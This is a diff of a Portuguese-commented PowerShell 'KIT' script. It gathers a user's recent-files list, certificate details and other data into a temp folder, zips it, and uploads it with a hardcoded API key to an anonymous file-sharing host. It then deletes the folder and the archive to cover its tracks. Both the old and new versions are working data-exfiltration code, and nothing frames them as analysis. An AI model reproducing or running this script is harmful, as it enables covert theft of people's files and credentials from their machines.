@@ -1,4 +1,4 @@
-# KIT v4.2 – AnonFilesNew arquivo por arquivo, 20 GB cada, PS 7.5.4
+# KIT v4.1 – ZIP único, confere conteúdo, sem compressão, AnonFilesNew 20 GB
 $kit="$env:TEMP\k"; ni -ItemType Directory $kit -Force |Out-Null
 
 # 1) TXT leves
@@ -24,28 +24,40 @@ Get-ChildItem $env:APPDATA\Microsoft\Windows\Recent -Name |Out-File $kit\rec.txt
 # 3) Certificados
 Get-ChildItem Cert:\CurrentUser\My|Select Subject,Thumbprint,NotAfter |Out-File $kit\certs.txt -Encoding UTF8
 
-# 3) Upload individual
-$key="AFtru5qQZX8HN5npouThcNDJtVbe6d"
-$uri="https://api.anonfilesnew.com/upload?key=$key&pretty=true"
-Get-ChildItem $kit -File |%{
-  $file=$_
-  try{
-    $boundary=[System.Guid]::NewGuid().ToString()
-    $lf="`r`n"
-    $body=(
-      "--$boundary$lf"+
-      "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"$lf"+
-      "Content-Type: application/octet-stream$lf$lf"+
-      [System.IO.File]::ReadAllBytes($file.FullName)+
-      "$lf--$boundary--$lf"
-    )
-    $bytes=[System.Text.Encoding]::UTF8.GetBytes($body)
-    $resp=Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
-    Write-Host "UPADO: $($resp.data.file.url.full)" -Fore Green
-  }catch{
-    Write-Host "FALHA em $($file.Name): $($_.Exception.Message)" -Fore Red
-  }
+# 4) ZIP sem compressão – garantido
+$zip="$env:TEMP\k.zip"
+if(Test-Path $zip){Remove-Item $zip -Force}
+$shell=New-Object -ComObject Shell.Application
+$zipFile=$shell.NameSpace($zip)
+# copia tudo
+Get-ChildItem $kit |%{$zipFile.CopyHere($_.FullName,4)}
+# aguarda terminar
+while($zipFile.Items().Count -ne (Get-ChildItem $kit).Count){Start-Sleep -m 500}
+# confere
+if((Get-childitem $kit).Count -ne $zipFile.Items().Count){
+  Write-Host "ERRO: arquivos faltando no ZIP" -Fore Red; exit
 }
 
-# 4) Limpa
-Remove-Item $kit -Recurse -Force
+# 5) Upload
+$file=Get-Item $zip
+$key="AFtru5qQZX8HN5npouThcNDJtVbe6d"
+$uri="https://api.anonfilesnew.com/upload?key=$key&pretty=true"
+try{
+  $boundary=[System.Guid]::NewGuid().ToString()
+  $lf="`r`n"
+  $body=(
+    "--$boundary$lf"+
+    "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"$lf"+
+    "Content-Type: application/octet-stream$lf$lf"+
+    [System.IO.File]::ReadAllBytes($file.FullName)+
+    "$lf--$boundary--$lf"
+  )
+  $bytes=[System.Text.Encoding]::UTF8.GetBytes($body)
+  $resp=Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
+  $resp.data.file.url.full
+}catch{
+  Write-Host "ERRO no upload: $($_.Exception.Message)" -Fore Red
+}
+
+# 6) Limpa
+Remove-Item $kit -Recurse -Force; Remove-Item $zip -Force
